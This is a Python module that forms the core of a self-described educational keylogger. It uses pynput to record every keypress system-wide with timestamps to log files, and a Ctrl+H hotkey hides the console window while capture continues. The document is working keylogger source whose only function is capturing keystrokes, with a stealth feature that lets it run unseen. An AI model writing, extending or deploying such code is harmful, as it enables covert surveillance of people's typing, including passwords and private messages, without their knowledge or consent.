"""
Core Logger module for the Educational Keyboard Input Logger.

Provides the ``KeyboardLogger`` class that listens for keyboard
events using the ``pynput`` library and delegates formatted output
to a ``LogFileManager``.

Hotkey Support:
    Ctrl+H — Toggle console window visibility (hide / show).
"""

from pynput import keyboard
from pynput.keyboard import Key

from keylogger.file_manager import LogFileManager
from keylogger.window_manager import ConsoleWindowManager
from keylogger.utils import get_timestamp, format_key


class KeyboardLogger:
    """Captures keyboard input and writes timestamped entries to log files.

    This class is the bridge between ``pynput``'s listener callbacks and
    the ``LogFileManager`` that handles file I/O and rotation.

    It also monitors for the **Ctrl+H** hotkey to toggle console
    window visibility via the ``ConsoleWindowManager``.

    Attributes:
        file_manager (LogFileManager): The file manager used for output.
        window_manager (ConsoleWindowManager): Controls console visibility.
        _listener (keyboard.Listener | None): The active pynput listener,
            or ``None`` before ``start()`` is called.
        _key_count (int): Running count of keys captured in this session.
        _ctrl_pressed (bool): Tracks whether a Ctrl key is currently held.
    """

    def __init__(
        self,
        file_manager: LogFileManager,
        window_manager: ConsoleWindowManager | None = None,
    ) -> None:
        """Initialize the logger with a file manager and optional window manager.

        Args:
            file_manager: An active ``LogFileManager`` instance that will
                receive formatted log lines.
            window_manager: An optional ``ConsoleWindowManager`` for
                hiding/showing the console via Ctrl+H.  If ``None``, the
                hotkey is silently ignored.
        """
        self.file_manager: LogFileManager = file_manager
        self.window_manager: ConsoleWindowManager | None = window_manager
        self._listener: keyboard.Listener | None = None
        self._key_count: int = 0
        self._ctrl_pressed: bool = False

    # ------------------------------------------------------------------
    # Listener callbacks
    # ------------------------------------------------------------------

    def _on_press(self, key) -> None:
        """Handle a key-press event from pynput.

        Detects the **Ctrl+H** hotkey to toggle the console window.
        For all other keys, formats the key into a human-readable string,
        prepends a timestamp, and writes the result to the log file.

        Args:
            key: A ``pynput.keyboard.Key`` or ``pynput.keyboard.KeyCode``
                 object describing the pressed key.
        """
        try:
            # Track Ctrl modifier state.
            if key in (Key.ctrl_l, Key.ctrl_r):
                self._ctrl_pressed = True
                return  # Don't log the Ctrl press itself when used as modifier.

            # ── Hotkey: Ctrl+H — toggle console visibility ────────────
            if self._ctrl_pressed and self.window_manager is not None:
                try:
                    char = key.char
                except AttributeError:
                    char = None

                if char == "\x08" or char == "h" or char == "H":
                    # '\x08' is the character produced by Ctrl+H on Windows.
                    self.window_manager.toggle()
                    return  # Don't log the hotkey itself.

            # ── Normal key — log it ───────────────────────────────────
            timestamp = get_timestamp()
            key_str = format_key(key)
            log_line = f"[{timestamp}]  {key_str}\n"

            self.file_manager.write(log_line)
            self._key_count += 1

        except Exception as exc:
            # Log the error but do not crash the listener.
            print(f"[ERROR] Failed to process key event: {exc}")

    def _on_release(self, key) -> None:
        """Handle a key-release event from pynput.

        Used solely to track when Ctrl keys are released so that the
        Ctrl+H hotkey detection works correctly.

        Args:
            key: A ``pynput.keyboard.Key`` or ``pynput.keyboard.KeyCode``
                 object describing the released key.
        """
        if key in (Key.ctrl_l, Key.ctrl_r):
            self._ctrl_pressed = False

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """Start the keyboard listener (non-blocking).

        The listener runs in a background daemon thread managed by
        ``pynput``.  Call ``stop()`` or press Ctrl+C to terminate.
        """
        self._listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        )
        self._listener.start()
        print("[INFO] Keyboard listener started.  Press Ctrl+C to stop.")
        print("[INFO] Press Ctrl+H to toggle console visibility.\n")

    def stop(self) -> None:
        """Stop the keyboard listener and close the file manager.

        Safe to call even if the listener was never started.
        """
        # Ensure the console is visible before printing shutdown info.
        if self.window_manager is not None and self.window_manager.is_hidden:
            self.window_manager.show()

        if self._listener is not None:
            self._listener.stop()
            self._listener.join()

        self.file_manager.close()
        print(f"\n[INFO] Session ended.  Total keys captured: {self._key_count}")

    @property
    def key_count(self) -> int:
        """Return the total number of keys captured so far."""
        return self._key_count
